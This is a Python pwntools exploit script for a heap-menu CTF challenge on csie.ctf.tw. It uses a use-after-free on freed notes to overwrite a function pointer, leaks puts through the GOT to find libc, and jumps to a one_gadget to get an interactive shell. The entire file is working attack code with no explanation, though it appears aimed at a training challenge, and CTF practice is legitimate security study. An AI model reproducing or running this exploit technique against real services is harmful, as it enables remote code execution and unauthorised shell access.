from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10139
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

# input('Press Enter to start.')

def add_note(size, content, sendline=True):
    # choice
    r.recvuntil(':')
    r.sendline(b'1')
    # new size
    r.recvuntil(':')
    r.sendline(str(size).encode())
    # content
    r.recvuntil(':')
    if sendline:
        r.sendline(content)
    else:
        r.send(content)

def delete_note(index):
    # choice
    r.recvuntil(':')
    r.sendline(b'2')
    # index
    r.recvuntil(':')
    r.sendline(str(index).encode())

def print_note(index):
    # choice
    r.recvuntil(':')
    r.sendline(b'3')
    # index
    r.recvuntil(':')
    r.sendline(str(index).encode())

print_note_content = 0x400886
puts_got = 0x0000000000602028
puts_off = 0x6f690

add_note(0x50, b'aaaaaaaa')
add_note(0x50, b'bbbbbbbb')
delete_note(0)
delete_note(1)

add_note(0x10, p64(print_note_content)+p64(puts_got), False)
sleep(1)
print_note(0)
puts = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
print('puts =', hex(puts))
libc = puts - puts_off
one_gadget = libc + 0x45216

delete_note(2)
add_note(0x10, p64(one_gadget))
print_note(0)

r.interactive()
